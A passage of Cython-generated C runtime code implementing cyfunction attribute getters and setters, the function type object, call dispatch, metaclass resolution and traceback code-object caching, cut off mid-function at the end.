__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}


static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}


static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases) {
    Py_ssize_t i, nbases = PyTuple_GET_SIZE(bases);
    for (i=0; i < nbases; i++) {
        PyTypeObject *tmptype;
        PyObject *tmp = PyTuple_GET_ITEM(bases, i);
        tmptype = Py_TYPE(tmp);
#if PY_MAJOR_VERSION < 3
        if (tmptype == &PyClass_Type)
            continue;
#endif
        if (!metaclass) {
            metaclass = tmptype;
            continue;
        }
        if (PyType_IsSubtype(metaclass, tmptype))
            continue;
        if (PyType_IsSubtype(tmptype, metaclass)) {
            metaclass = tmptype;
            continue;
        }
        PyErr_SetString(PyExc_TypeError,
                        "metaclass conflict: "
                        "the metaclass of a derived class "
                        "must be a (non-strict) subclass "
                        "of the metaclasses of all its bases");
        return NULL;
    }
    if (!metaclass) {
#if PY_MAJOR_VERSION < 3
        metaclass = &PyClass_Type;
#else
        metaclass = &PyType_Type;
#endif
    }
    Py_INCREF((PyObject*) metaclass);
    return (PyObject*) metaclass;
}


static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name,
                                           PyObject *qualname, PyObject *mkw, PyObject *modname, PyObject *doc) {
    PyObject *ns;
    if (metaclass) {
        PyObject *prep = __Pyx_PyObject_GetAttrStr(metaclass, __pyx_n_s_prepare);
        if (prep) {
            PyObject *pargs = PyTuple_Pack(2, name, bases);
            if (unlikely(!pargs)) {
                Py_DECREF(prep);
                return NULL;
            }
            ns = PyObject_Call(prep, pargs, mkw);
            Py_DECREF(prep);
            Py_DECREF(pargs);
        } else {
            if (unlikely(!PyErr_ExceptionMatches(PyExc_AttributeError)))
                return NULL;
            PyErr_Clear();
            ns = PyDict_New();
        }
    } else {
        ns = PyDict_New();
    }
    if (unlikely(!ns))
        return NULL;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_module, modname) < 0)) goto bad;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_qualname, qualname) < 0)) goto bad;
    if (unlikely(doc && PyObject_SetItem(ns, __pyx_n_s_doc, doc) < 0)) goto bad;
    return ns;
bad:
    Py_DECREF(ns);
    return NULL;
}
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases,
                                      PyObject *dict, PyObject *mkw,
                                      int calculate_metaclass, int allow_py2_metaclass) {
    PyObject *result, *margs;
    PyObject *owned_metaclass = NULL;
    if (allow_py2_metaclass) {
        owned_metaclass = PyObject_GetItem(dict, __pyx_n_s_metaclass);
        if (owned_metaclass) {
            metaclass = owned_metaclass;
        } else if (likely(PyErr_ExceptionMatches(PyExc_KeyError))) {
            PyErr_Clear();
        } else {
            return NULL;
        }
    }
    if (calculate_metaclass && (!metaclass || PyType_Check(metaclass))) {
        metaclass = __Pyx_CalculateMetaclass((PyTypeObject*) metaclass, bases);
        Py_XDECREF(owned_metaclass);
        if (unlikely(!metaclass))
            return NULL;
        owned_metaclass = metaclass;
    }
    margs = PyTuple_Pack(3, name, bases, dict);
    if (unlikely(!margs)) {
        result = NULL;
    } else {
        result = PyObject_Call(metaclass, margs, mkw);
        Py_DECREF(margs);
    }
    Py_XDECREF(owned_metaclass);
    return result;
}


#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif


static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}


#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        __pyx_empty_tuple, 
        py_srcfile,   
        py_funcname,  
        py_line,
        __pyx_empty_bytes  
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
